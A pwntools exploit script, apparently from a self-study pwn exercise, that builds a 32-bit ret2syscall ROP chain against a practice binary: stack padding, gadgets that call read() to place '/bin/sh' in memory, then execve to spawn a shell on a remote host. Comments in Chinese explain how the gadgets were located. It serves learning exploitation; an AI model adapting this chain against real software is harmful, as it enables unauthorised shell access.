'''
Author: 白银
Date: 2023-01-02 17:00:47
LastEditTime: 2023-01-02 20:03:49
LastEditors: 白银
Description: gcc question_5_test9_syscall.c -m32 -fno-stack-protector -no-pie -static -o question_5_x86_test9_syscall  https://www.bilibili.com/video/BV1mr4y1Y7fW?t=4296.1&p=23
Attention: ret2syscall
FilePath: /pwn/question_5_x86_test9_syscall.py
'''

from pwn import *

set_arch = 2

if set_arch == 0:
    context(log_level='debug', arch='amd64', os='linux')
elif set_arch == 1:
    context(log_level='debug', arch='arm64', os='linux')
elif set_arch == 2:
    context(log_level='debug', arch='i386', os='linux')

pwnfile = './question_5_x86_test9_syscall'
state = 0  # 0为远程

if state == 0:
    io = remote("192.168.61.139", 8888)
    # io = remote("129.226.211.132", 8888)
else:
    io = process(pwnfile)

    # 本地用
    elf = ELF(pwnfile)
    rop = ROP(pwnfile)

    # 本地调试用
    gdb.attach(io)
    pause()

'''
开始准备布置栈帧
'''
padding2ebp = 0x10  # ida看，最上面一个var和s差多少
padding = padding2ebp + 4
# alt+t找int     80h，用和retn靠在一起的，如果中间隔了一个pop之类，插一个deadbeef就行
int0x80_addr = 0x08071FE0
# ROPgadget --binary question_5_x86_test9_syscall --only "pop|ret" | grep eax的0x080ae706 : pop eax ; ret
pop_eax_ret = 0x080ae706
# ROPgadget --binary question_5_x86_test9_syscall --only "pop|ret" | grep ebx的0x0804901e : pop ebx ; ret
pop_ebx_ret = 0x0804901e
# ROPgadget --binary question_5_x86_test9_syscall --only "pop|ret" | grep edx的0x08069ca8 : pop edx ; ret
pop_edx_ret = 0x08069ca8
# ROPgadget --binary question_5_x86_test9_syscall --only "pop|ret" | grep ecx找不到
# 用OPgadget --binary question_5_x86_test9_syscall | grep ecx | grep mov的0x080929b0 : mov ecx, eax ; mov eax, ecx ; ret
mov_ecx_eax_ret = 0x080929b0
# 找不到“/bin/sh”，vmmap找rw的地址范围，去ida在指定的地址范围内找align 多少h，把上下两行差距≥8的第一行的地址当作写入/bin/sh的地址，最好找附近带？的
# 找到地址后，用x/数字gx 地址看一下多少位是0，大概够不够
bin_ssh_addr = 0x80E6048 # 此处原为80E6044，为了对齐，加了4

payload = flat(['a' * padding])
# 执行 read(0, bin_ssh_addr, 0)  rax = 3, ebx = 0, ecx = bin_ssh_addr, edx = 8
payload += flat([pop_eax_ret, bin_ssh_addr, mov_ecx_eax_ret, pop_eax_ret, 3, pop_ebx_ret, 0, pop_edx_ret, 8, int0x80_addr]) # 3是32位read的中断位
# 执行 execve('/bin/sh', 0, 0)  rax = 11, ebx = bin_ssh_addr, ecx = , edx = 0
payload += flat([pop_eax_ret, 0, mov_ecx_eax_ret, pop_eax_ret, 11, pop_ebx_ret, bin_ssh_addr, pop_edx_ret, 0, int0x80_addr]) # 每两个一组进行类似赋值操作，后数字给前，从最后开始数，上同，x64同

delimiter = 'input:'

if state == 0:
    io.sendline(payload)  # 远程用
else:
    io.sendlineafter(delimiter, payload)  # 本地用

io.send(b'/bin/sh\0x00')
io.interactive()
